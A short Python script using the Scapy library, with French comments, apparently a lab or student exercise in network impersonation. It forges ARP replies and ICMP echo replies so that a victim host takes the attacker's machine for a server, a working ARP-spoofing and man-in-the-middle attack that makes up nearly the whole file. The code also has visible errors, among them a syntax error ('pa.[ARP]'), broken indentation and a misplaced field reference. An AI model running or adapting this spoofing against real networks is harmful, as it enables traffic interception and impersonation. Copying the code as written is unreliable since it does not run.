#! /usr/bin/python3

from scapy.all import *


myMAC = ""
victim = ""
server = ""
# envoi d'un ARP
packet=Ether(src=myMAC ,dst="ff:ff:ff:ff:ff:ff")/ARP(hwlen=6,plen=4,op=1,hwsrc=myMAC,psrc=server,pdst=victim)
answer = srp1(packet, timeout=1, verbose=False)

victimMAC = answer[ARP].hwsrc

packet2 =Ether(src=myMAC, dst=answer[ARP].hwsrc)/IP(src=server, dst=victim)/ICMP(type=8)/"data" 
answer2 = srp1(packet2, timeout=1, verbose=False)

if answer2:
	print("ahah :D ")
else:
	print("ohoh :/ ")


def test(pa):
	if pa.haslayer(ARP) is True:
		if pa[ARP].psrc == victim and pa[ARP].pdst == server and pa[ARP].op == 1:
			print(".", flush=True)
 		pr = Ether(src=myMAC, dst=victimMAC)/ARP(hwlen=pa[ARP].hwlen, plen=pa.[ARP].plen, op=2, hwsrc=myMAC, psrc=server, pdst=victim, hwdst=victimMAC)
 		send(pr, verbose=False)



	if pa.haslayer(ICMP) is True:
		if pa[IP].src == victim and pa[IP].dst == server and pa[IP].type == 8:
			print("I.", flush=True)
			pr = Ether(src=myMAC, dst=victimMAC)/IP(src=server, dst=victim)/ICMP(type=0)/"data"
			send(pr, verbose=False)


print("[*] Usurpation:...")
bpf = "ether src " +  victimMAC
sniff(filter=bpf, prn=test)

